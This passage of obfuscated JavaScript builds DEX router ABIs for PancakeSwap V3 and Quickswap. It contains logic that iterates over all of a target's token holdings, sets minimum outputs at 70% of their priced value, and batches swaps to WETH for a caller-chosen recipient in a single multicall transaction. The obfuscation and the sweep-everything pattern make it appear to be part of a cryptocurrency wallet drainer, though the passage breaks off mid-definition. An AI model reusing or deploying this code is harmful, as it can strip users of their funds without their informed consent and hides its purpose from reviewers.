            name: "callPositionManager",
            outputs: [{
              'internalType': "bytes",
              'name': "result",
              'type': "bytes"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x4b75c3 = {
            internalType: "bytes[]",
            name: "paths",
            type: "bytes[]"
          };
          const _0x15f438 = {
            internalType: 'uint128[]',
            name: "amounts",
            type: 'uint128[]'
          };
          const _0x33dfec = {
            internalType: "uint24",
            name: "maximumTickDivergence",
            type: "uint24"
          };
          const _0xe1028c = {
            internalType: "uint32",
            name: "secondsAgo",
            type: "uint32"
          };
          const _0x3cda66 = {
            inputs: [_0x4b75c3, _0x15f438, _0x33dfec, _0xe1028c],
            name: "checkOracleSlippage",
            outputs: [],
            stateMutability: "view",
            type: "function"
          };
          const _0x3ebc31 = {
            internalType: "bytes",
            name: 'path',
            type: "bytes"
          };
          const _0x1ee2dc = {
            internalType: "uint24",
            name: "maximumTickDivergence",
            type: "uint24"
          };
          const _0x147faa = {
            internalType: "uint32",
            name: "secondsAgo",
            type: "uint32"
          };
          const _0xf15033 = {
            inputs: [_0x3ebc31, _0x1ee2dc, _0x147faa],
            name: "checkOracleSlippage",
            outputs: [],
            stateMutability: "view",
            type: "function"
          };
          const _0x5112fc = {
            inputs: [],
            name: 'deployer',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2f93c7 = {
            internalType: "bytes",
            name: 'path',
            type: "bytes"
          };
          const _0x5644ce = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x360f0c = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x440442 = {
            internalType: 'uint256',
            name: "amountOutMinimum",
            type: 'uint256'
          };
          const _0x42e375 = {
            components: [_0x2f93c7, _0x5644ce, _0x360f0c, _0x440442],
            internalType: "struct IV3SwapRouter.ExactInputParams",
            name: "params",
            type: "tuple"
          };
          const _0xdbea6 = {
            inputs: [_0x42e375],
            name: 'exactInput',
            outputs: [{
              'internalType': 'uint256',
              'name': "amountOut",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5e846c = {
            internalType: 'address',
            name: "tokenIn",
            type: "address"
          };
          const _0x16b371 = {
            internalType: 'address',
            name: "tokenOut",
            type: "address"
          };
          const _0x3790e5 = {
            internalType: "uint24",
            name: "fee",
            type: "uint24"
          };
          const _0x1f1f2a = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x23b69b = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x565e43 = {
            internalType: 'uint256',
            name: "amountOutMinimum",
            type: 'uint256'
          };
          const _0x350b64 = {
            internalType: 'uint160',
            name: "sqrtPriceLimitX96",
            type: "uint160"
          };
          const _0x622a7c = {
            components: [_0x5e846c, _0x16b371, _0x3790e5, _0x1f1f2a, _0x23b69b, _0x565e43, _0x350b64],
            internalType: "struct IV3SwapRouter.ExactInputSingleParams",
            name: "params",
            type: "tuple"
          };
          const _0xe6d837 = {
            inputs: [_0x622a7c],
            name: "exactInputSingle",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5f0977 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x285e5d = {
            internalType: 'uint256[]',
            name: "flag",
            type: 'uint256[]'
          };
          const _0x47a399 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x17f5ac = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x3c9572 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3005a9 = {
            internalType: 'uint256',
            name: "amountOut",
            type: 'uint256'
          };
          const _0x4b0d8c = {
            inputs: [_0x5f0977, _0x285e5d, _0x47a399, _0x17f5ac, _0x3c9572],
            name: "exactInputStableSwap",
            outputs: [_0x3005a9],
            stateMutability: "payable",
            type: "function"
          };
          const _0x578114 = {
            internalType: "bytes",
            name: 'path',
            type: "bytes"
          };
          const _0x24ed11 = {
            internalType: 'address',
            name: 'recipient',
            type: "address"
          };
          const _0x4f2707 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x5310cd = {
            internalType: 'uint256',
            name: "amountInMaximum",
            type: 'uint256'
          };
          const _0x831184 = {
            components: [_0x578114, _0x24ed11, _0x4f2707, _0x5310cd],
            internalType: "struct IV3SwapRouter.ExactOutputParams",
            name: "params",
            type: "tuple"
          };
          const _0x30e277 = {
            inputs: [_0x831184],
            name: "exactOutput",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x14291b = {
            internalType: "address",
            name: "tokenIn",
            type: "address"
          };
          const _0x542dc7 = {
            internalType: "address",
            name: "tokenOut",
            type: "address"
          };
          const _0x2c7a3d = {
            internalType: "uint24",
            name: "fee",
            type: "uint24"
          };
          const _0x2415ca = {
            internalType: "address",
            name: "recipient",
            type: "address"
          };
          const _0x2a7df0 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x259985 = {
            internalType: 'uint256',
            name: "amountInMaximum",
            type: "uint256"
          };
          const _0x18138e = {
            internalType: 'uint160',
            name: "sqrtPriceLimitX96",
            type: 'uint160'
          };
          const _0x3c3e81 = {
            components: [_0x14291b, _0x542dc7, _0x2c7a3d, _0x2415ca, _0x2a7df0, _0x259985, _0x18138e],
            internalType: "struct IV3SwapRouter.ExactOutputSingleParams",
            name: "params",
            type: "tuple"
          };
          const _0x31c96d = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x4c3c8e = {
            inputs: [_0x3c3e81],
            name: "exactOutputSingle",
            outputs: [_0x31c96d],
            stateMutability: "payable",
            type: 'function'
          };
          const _0x5e3316 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x33148d = {
            internalType: 'uint256[]',
            name: 'flag',
            type: 'uint256[]'
          };
          const _0x157a2d = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x287162 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: "uint256"
          };
          const _0xf0564e = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x20d9cd = {
            inputs: [_0x5e3316, _0x33148d, _0x157a2d, _0x287162, _0xf0564e],
            name: "exactOutputStableSwap",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: 'function'
          };
          const _0x56bd30 = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x37d1d6 = {
            inputs: [],
            name: "factoryV2",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: 'function'
          };
          const _0x10cbc5 = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x24bfdb = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x3221a3 = {
            internalType: "enum IApproveAndCall.ApprovalType",
            name: '',
            type: "uint8"
          };
          const _0x4dac68 = {
            inputs: [_0x10cbc5, _0x24bfdb],
            name: "getApprovalType",
            outputs: [_0x3221a3],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4c392a = {
            internalType: "address",
            name: "token0",
            type: "address"
          };
          const _0x27efea = {
            internalType: "address",
            name: "token1",
            type: "address"
          };
          const _0xb4b663 = {
            internalType: 'uint256',
            name: "tokenId",
            type: 'uint256'
          };
          const _0x4824a6 = {
            internalType: "uint256",
            name: "amount0Min",
            type: "uint256"
          };
          const _0xc68a1d = {
            internalType: 'uint256',
            name: 'amount1Min',
            type: 'uint256'
          };
          const _0xfb8e55 = {
            components: [_0x4c392a, _0x27efea, _0xb4b663, _0x4824a6, _0xc68a1d],
            internalType: "struct IApproveAndCall.IncreaseLiquidityParams",
            name: "params",
            type: "tuple"
          };
          const _0xf30106 = {
            inputs: [_0xfb8e55],
            name: "increaseLiquidity",
            outputs: [{
              'internalType': "bytes",
              'name': 'result',
              'type': "bytes"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2ac0ce = {
            internalType: "address",
            name: "token0",
            type: "address"
          };
          const _0x20ce0c = {
            internalType: "address",
            name: 'token1',
            type: "address"
          };
          const _0x5eaf0b = {
            internalType: 'uint24',
            name: "fee",
            type: "uint24"
          };
          const _0x39c52f = {
            internalType: "int24",
            name: "tickLower",
            type: "int24"
          };
          const _0x458f00 = {
            internalType: "int24",
            name: "tickUpper",
            type: "int24"
          };
          const _0xc9ec4f = {
            internalType: 'uint256',
            name: "amount0Min",
            type: 'uint256'
          };
          const _0x25ffb6 = {
            internalType: 'uint256',
            name: "amount1Min",
            type: 'uint256'
          };
          const _0x5f3ee7 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x2e9c8d = {
            components: [_0x2ac0ce, _0x20ce0c, _0x5eaf0b, _0x39c52f, _0x458f00, _0xc9ec4f, _0x25ffb6, _0x5f3ee7],
            internalType: "struct IApproveAndCall.MintParams",
            name: "params",
            type: "tuple"
          };
          const _0x5dfaee = {
            internalType: "bytes",
            name: "result",
            type: "bytes"
          };
          const _0x58defc = {
            inputs: [_0x2e9c8d],
            name: "mint",
            outputs: [_0x5dfaee],
            stateMutability: "payable",
            type: "function"
          };
          const _0x21b29b = {
            internalType: "bytes32",
            name: "previousBlockhash",
            type: "bytes32"
          };
          const _0x3bf4bc = {
            internalType: "bytes[]",
            name: "data",
            type: "bytes[]"
          };
          const _0xbc538a = {
            inputs: [_0x21b29b, _0x3bf4bc],
            name: 'multicall',
            outputs: [{
              'internalType': "bytes[]",
              'name': '',
              'type': "bytes[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5c069e = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4ce5ce = {
            internalType: "bytes[]",
            name: "data",
            type: "bytes[]"
          };
          const _0x15f022 = {
            inputs: [_0x5c069e, _0x4ce5ce],
            name: 'multicall',
            outputs: [{
              'internalType': 'bytes[]',
              'name': '',
              'type': "bytes[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x12b9f3 = {
            internalType: "bytes[]",
            name: "data",
            type: 'bytes[]'
          };
          const _0x435524 = {
            inputs: [_0x12b9f3],
            name: 'multicall',
            outputs: [{
              'internalType': "bytes[]",
              'name': "results",
              'type': "bytes[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3ec04f = {
            inputs: [],
            name: "owner",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2dac9c = {
            internalType: "int256",
            name: "amount0Delta",
            type: "int256"
          };
          const _0x83db8b = {
            internalType: "int256",
            name: "amount1Delta",
            type: 'int256'
          };
          const _0x27cf86 = {
            internalType: "bytes",
            name: "_data",
            type: "bytes"
          };
          const _0x3c194b = {
            inputs: [_0x2dac9c, _0x83db8b, _0x27cf86],
            name: "pancakeV3SwapCallback",
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x2e6b9d = {
            inputs: [],
            name: "positionManager",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x410d6f = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x40c22e = {
            internalType: 'uint256',
            name: "value",
            type: 'uint256'
          };
          const _0x18d183 = {
            inputs: [_0x410d6f, _0x40c22e],
            name: "pull",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x9723f6 = {
            inputs: [],
            name: 'refundETH',
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5869c2 = {
            inputs: [],
            name: "renounceOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x49d710 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x6c6dcc = {
            internalType: 'uint256',
            name: "value",
            type: 'uint256'
          };
          const _0x2f75e6 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0xd10fef = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x318658 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x1c92e3 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x302975 = {
            inputs: [_0x49d710, _0x6c6dcc, _0x2f75e6, _0xd10fef, _0x318658, _0x1c92e3],
            name: 'selfPermit',
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3c98e8 = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x2f2d96 = {
            internalType: 'uint256',
            name: "nonce",
            type: "uint256"
          };
          const _0x21b105 = {
            internalType: 'uint256',
            name: "expiry",
            type: 'uint256'
          };
          const _0x1febe1 = {
            internalType: 'uint8',
            name: 'v',
            type: "uint8"
          };
          const _0x2b77cc = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x202ae2 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0xba212e = {
            inputs: [_0x3c98e8, _0x2f2d96, _0x21b105, _0x1febe1, _0x2b77cc, _0x202ae2],
            name: "selfPermitAllowed",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0xd08691 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x33dbd0 = {
            internalType: "uint256",
            name: "nonce",
            type: 'uint256'
          };
          const _0x13d4fd = {
            internalType: 'uint256',
            name: "expiry",
            type: 'uint256'
          };
          const _0x2e3021 = {
            internalType: "uint8",
            name: 'v',
            type: 'uint8'
          };
          const _0x2d26d7 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0xc59148 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x5a4d02 = {
            inputs: [_0xd08691, _0x33dbd0, _0x13d4fd, _0x2e3021, _0x2d26d7, _0xc59148],
            name: "selfPermitAllowedIfNecessary",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x171722 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x3f85c2 = {
            internalType: 'uint256',
            name: "value",
            type: "uint256"
          };
          const _0x3489b6 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x226a80 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x323983 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x5c309e = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x43a7b8 = {
            inputs: [_0x171722, _0x3f85c2, _0x3489b6, _0x226a80, _0x323983, _0x5c309e],
            name: "selfPermitIfNecessary",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0xd57277 = {
            internalType: 'address',
            name: "_factory",
            type: "address"
          };
          const _0x130a30 = {
            internalType: 'address',
            name: "_info",
            type: "address"
          };
          const _0x450411 = {
            inputs: [_0xd57277, _0x130a30],
            name: "setStableSwap",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x19d629 = {
            inputs: [],
            name: "stableSwapFactory",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: 'function'
          };
          const _0x5871de = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x29940b = {
            inputs: [],
            name: "stableSwapInfo",
            outputs: [_0x5871de],
            stateMutability: "view",
            type: "function"
          };
          const _0x42a583 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x10045f = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: "uint256"
          };
          const _0x564a8d = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x283ae8 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3738a4 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x13355d = {
            inputs: [_0x42a583, _0x10045f, _0x564a8d, _0x283ae8],
            name: "swapExactTokensForTokens",
            outputs: [_0x3738a4],
            stateMutability: 'payable',
            type: "function"
          };
          const _0x79a4f1 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x137b21 = {
            internalType: "uint256",
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x825504 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x53f1b0 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2c9a5d = {
            inputs: [_0x79a4f1, _0x137b21, _0x825504, _0x53f1b0],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x266ccf = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x5eb876 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x2e7cb2 = {
            internalType: 'address',
            name: 'recipient',
            type: "address"
          };
          const _0x4d98ad = {
            inputs: [_0x266ccf, _0x5eb876, _0x2e7cb2],
            name: "sweepToken",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2556fa = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x4472d2 = {
            internalType: "uint256",
            name: "amountMinimum",
            type: "uint256"
          };
          const _0x24d188 = {
            inputs: [_0x2556fa, _0x4472d2],
            name: "sweepToken",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x13e3a1 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0xcc2908 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x3c56ac = {
            internalType: "uint256",
            name: "feeBips",
            type: 'uint256'
          };
          const _0x27a596 = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x31df07 = {
            inputs: [_0x13e3a1, _0xcc2908, _0x3c56ac, _0x27a596],
            name: "sweepTokenWithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x400621 = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x3f89bc = {
            internalType: "uint256",
            name: "amountMinimum",
            type: "uint256"
          };
          const _0x23aaf6 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x22a11a = {
            internalType: 'uint256',
            name: "feeBips",
            type: "uint256"
          };
          const _0x534c6a = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x31a73f = {
            inputs: [_0x400621, _0x3f89bc, _0x23aaf6, _0x22a11a, _0x534c6a],
            name: "sweepTokenWithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x54ad97 = {
            internalType: 'address',
            name: "newOwner",
            type: "address"
          };
          const _0x5efeb1 = {
            inputs: [_0x54ad97],
            name: "transferOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2a8825 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: "uint256"
          };
          const _0x27d525 = {
            internalType: "address",
            name: "recipient",
            type: "address"
          };
          const _0x218208 = {
            inputs: [_0x2a8825, _0x27d525],
            name: "unwrapWETH9",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x39db8c = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x13eba5 = {
            internalType: "address",
            name: "recipient",
            type: "address"
          };
          const _0x55b30d = {
            internalType: 'uint256',
            name: "feeBips",
            type: "uint256"
          };
          const _0xb07496 = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x4effa5 = {
            inputs: [_0x39db8c, _0x13eba5, _0x55b30d, _0xb07496],
            name: "unwrapWETH9WithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x46b334 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x1bbd4a = {
            internalType: 'uint256',
            name: "feeBips",
            type: 'uint256'
          };
          const _0x45effb = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x272056 = {
            inputs: [_0x46b334, _0x1bbd4a, _0x45effb],
            name: "unwrapWETH9WithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0xa7610a = {
            internalType: "uint256",
            name: "value",
            type: 'uint256'
          };
          const _0x5df547 = {
            inputs: [_0xa7610a],
            name: "wrapETH",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x579c22 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x3a9155 = [_0x4db681, _0x1c4187, _0x5b20ed, _0x352343, _0x2f1f78, _0x2c764a, _0x29a618, _0x298361, _0xab5216, _0x3cda66, _0xf15033, _0x5112fc, _0xdbea6, _0xe6d837, _0x4b0d8c, _0x30e277, _0x4c3c8e, _0x20d9cd, _0x56bd30, _0x37d1d6, _0x4dac68, _0xf30106, _0x58defc, _0xbc538a, _0x15f022, _0x435524, _0x3ec04f, _0x3c194b, _0x2e6b9d, _0x18d183, _0x9723f6, _0x5869c2, _0x302975, _0xba212e, _0x5a4d02, _0x43a7b8, _0x450411, _0x19d629, _0x29940b, _0x13355d, _0x2c9a5d, _0x4d98ad, _0x24d188, _0x31df07, _0x31a73f, _0x5efeb1, _0x218208, _0x4effa5, _0x272056, _0x5df547, _0x579c22];
          let _0x3eee03 = new ethers.Contract(_0x3941f8, _0x3a9155, _0xab3127);
          let _0x26e7aa = await _0x3eee03.WETH9();
          let _0xe48d79 = _0x2a18aa.asset;
          let _0x80421d = [];
          for (let _0x29e7a0 of _0xe48d79) {
            let _0x486fb4 = [];
            _0x486fb4[0] = _0x29e7a0.token;
            _0x486fb4[1] = _0x26e7aa;
            try {
              let _0x259024 = this.token_array.find(_0x5de928 => _0x5de928.token_address == _0x29e7a0.token && _0x5de928.chain == _0x2a18aa.chain);
              let _0x47a254 = this.token_array.find(_0x1b1804 => _0x1b1804.token_address == "native" && _0x1b1804.chain == _0x2a18aa.chain);
              console.log("Price " + _0x47a254.price);
              console.log(Number(_0x259024.value) * Number(0.7) / Number(_0x47a254.price));
              _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x259024.value) * Number(0.7) / Number(_0x47a254.price)).toString(), "ether")).toString();
            } catch {}
            console.log(_0xcd0737);
            let _0x3d4eb8 = _0x3eee03["interface"].encodeFunctionData("swapExactTokensForTokens", [_0x29e7a0.amount, _0xcd0737, _0x486fb4, this.getCaller(_0x2a18aa)]);
            _0x80421d.push(_0x3d4eb8);
          }
          let _0x38d36f = _0x3eee03["interface"].encodeFunctionData("multicall(bytes[])", [_0x80421d]);
          let _0x80447b = {
            'to': _0x3941f8,
            'from': await this.getWalletAddress(),
            'data': _0x38d36f
          };
          return [_0xab3127.sendTransaction(_0x80447b), _0x26e7aa];
        }
      case "Quickswap":
        {
          const _0x5944a0 = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0xab224b = {
            internalType: "address",
            name: "_WETH",
            type: "address"
          };
          const _0x335c68 = {
            inputs: [_0x5944a0, _0xab224b],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x1b8f15 = {
            inputs: [],
            name: "WETH",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x36db5f = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x32585f = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0xfdd2e5 = {
            internalType: 'uint256',
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x470438 = {
            internalType: "uint256",
            name: "amountBDesired",
            type: 'uint256'
          };
          const _0x1b6603 = {
            internalType: "uint256",
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x157718 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x46f897 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xef7c1a = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3ba839 = {
            inputs: [_0x36db5f, _0x32585f, _0xfdd2e5, _0x470438, _0x1b6603, _0x157718, _0x46f897, _0xef7c1a],
            name: "addLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4cbe7e = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x5b4b5c = {
            internalType: 'uint256',
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0x141c24 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x60217d = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x4db860 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3be37d = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x49716d = {
            internalType: "uint256",
            name: "amountToken",
            type: 'uint256'
          };
          const _0x5acfa2 = {
            internalType: "uint256",
            name: "amountETH",
            type: 'uint256'
          };
          const _0x2fa92e = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x3639 = {
            inputs: [_0x4cbe7e, _0x5b4b5c, _0x141c24, _0x60217d, _0x4db860, _0x3be37d],
            name: "addLiquidityETH",
            outputs: [_0x49716d, _0x5acfa2, _0x2fa92e],
            stateMutability: "payable",
            type: "function"
          };
          const _0x599c83 = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x5370d4 = {
            internalType: "uint256",
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x1613f8 = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x8be0b0 = {
            internalType: 'uint256',
            name: "reserveOut",
            type: 'uint256'
          };
          const _0x2d85b3 = {
            inputs: [_0x5370d4, _0x1613f8, _0x8be0b0],
            name: "getAmountIn",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountIn",
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x40ea92 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: "uint256"
          };
          const _0x5a6dc9 = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x314f61 = {
            internalType: "uint256",
            name: "reserveOut",
            type: "uint256"
          };
          const _0x2bdbba = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0xffdc9a = {
            inputs: [_0x40ea92, _0x5a6dc9, _0x314f61],
            name: "getAmountOut",
            outputs: [_0x2bdbba],
            stateMutability: "pure",
            type: "function"
          };
          const _0x10a3d9 = {
            internalType: "uint256",
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x2c4d31 = {
            internalType: 'address[]',
            name: 'path',
            type: "address[]"
          };
          const _0x5bc779 = {
            inputs: [_0x10a3d9, _0x2c4d31],
            name: "getAmountsIn",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3af424 = {
            internalType: "uint256",
            name: 'amountIn',
            type: "uint256"
          };
          const _0x126cd6 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x450e9e = {
            inputs: [_0x3af424, _0x126cd6],
            name: "getAmountsOut",
            outputs: [{
              'internalType': 'uint256[]',
              'name': 'amounts',
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x1aeefa = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0x24e9fc = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x2b7a3c = {
            internalType: 'uint256',
            name: "reserveB",
            type: 'uint256'
          };
          const _0x2ac7da = {
            inputs: [_0x1aeefa, _0x24e9fc, _0x2b7a3c],
            name: "quote",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x22ff8d = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x55d1b2 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x1a0612 = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x3c8d0c = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x4415f0 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x41aa26 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1c91f7 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x1cf1a2 = {
            inputs: [_0x22ff8d, _0x55d1b2, _0x1a0612, _0x3c8d0c, _0x4415f0, _0x41aa26, _0x1c91f7],
            name: "removeLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x181579 = {
            internalType: "address",
            name: 'token',
